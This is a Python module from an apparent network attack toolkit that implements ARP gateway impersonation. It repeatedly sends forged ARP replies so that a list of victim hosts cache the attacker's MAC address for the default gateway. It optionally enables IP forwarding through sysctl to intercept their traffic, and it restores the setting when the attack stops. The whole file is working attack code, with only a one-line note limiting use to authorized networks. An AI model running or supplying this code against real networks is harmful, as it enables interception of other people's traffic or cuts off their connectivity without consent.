"""ARP-based gateway impersonation: claim the default gateway's address for a set of hosts.

Hosts send everything that leaves their subnet to the MAC address they have cached
for the default gateway. This attack makes each listed victim cache the attacker's
MAC for the gateway's IP. It can also enable IP forwarding on the attacker, so the
traffic it receives is passed on. Without forwarding, the victims lose their
connectivity, which is a denial of service and not an interception.

Unlike ARP spoofing, which binds any address to one victim, this attack targets the
gateway for a whole set of hosts, and it changes how the attacker's host forwards
packets. Forwarding is restored when the attack stops.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import sendp

from macabre.attacks.arp_spoofing import build_arp_reply, parse_ipv4
from macabre.attacks.common import Runner, read_interface_mac, run_command

FORWARDING_KEY = "net.ipv4.ip_forward"


def parse_victims(value: str) -> list[str]:
    """Victim IPs separated by commas or spaces, without duplicates."""
    items = [item for item in value.replace(",", " ").split() if item]
    if not items:
        raise ValueError("At least one victim IP is required.")
    victims: list[str] = []
    for item in items:
        address = parse_ipv4(item, "victim IP")
        if address not in victims:
            victims.append(address)
    return victims


@dataclass(frozen=True)
class GatewayImpersonationConfig:
    iface: str                  # attacker interface, on the victims' segment
    gateway_ip: str             # default gateway address to claim
    victims: str                # victim IPs, separated by commas or spaces
    count: int = 0              # rounds (each round answers every victim); 0 = until stopped
    interval: float = 1.0       # seconds between rounds
    enable_forwarding: bool = True   # forward the traffic the victims send to the attacker
    dry_run: bool = False       # report what would be done, change nothing

    def __post_init__(self) -> None:
        gateway = parse_ipv4(self.gateway_ip, "gateway IP")
        if gateway in parse_victims(self.victims):
            raise ValueError("The gateway cannot also be a victim.")


@dataclass
class GatewayImpersonationStats:
    sender_mac: str = ""
    victims: int = 0
    rounds: int = 0
    frames: int = 0
    forwarding_active: bool = False
    status: str = ""


def run_gateway_impersonation(
    config: GatewayImpersonationConfig,
    stop_event: threading.Event,
    on_progress: Callable[[GatewayImpersonationStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> GatewayImpersonationStats:
    """Claim the gateway for every victim until `count` or `stop_event`, then restore forwarding."""
    run = run or run_command
    send = send or sendp
    gateway = parse_ipv4(config.gateway_ip, "gateway IP")
    victims = parse_victims(config.victims)
    stats = GatewayImpersonationStats(victims=len(victims))

    if config.dry_run:
        stats.status = (
            f"Dry run: would claim {gateway} for {len(victims)} victim(s) "
            f"and {'enable' if config.enable_forwarding else 'leave'} IP forwarding. Nothing changed."
        )
        on_progress(replace(stats))
        return stats

    sender_mac = read_interface_mac(config.iface, run)
    stats.sender_mac = sender_mac
    original_forwarding = None
    if config.enable_forwarding:
        original_forwarding = run(["sysctl", "-n", FORWARDING_KEY]).strip()
    try:
        if config.enable_forwarding:
            run(["sysctl", "-w", f"{FORWARDING_KEY}=1"])
            stats.forwarding_active = True
        on_progress(replace(stats))
        while not stop_event.is_set() and (config.count == 0 or stats.rounds < config.count):
            for victim in victims:
                send(build_arp_reply(sender_mac, gateway, victim), iface=config.iface, verbose=False)
                stats.frames += 1
            stats.rounds += 1
            on_progress(replace(stats))
            stop_event.wait(config.interval)
    finally:
        if original_forwarding is not None:
            run(["sysctl", "-w", f"{FORWARDING_KEY}={original_forwarding}"])
            stats.forwarding_active = False
            stats.status = f"Restored {FORWARDING_KEY} to {original_forwarding}."
    return stats
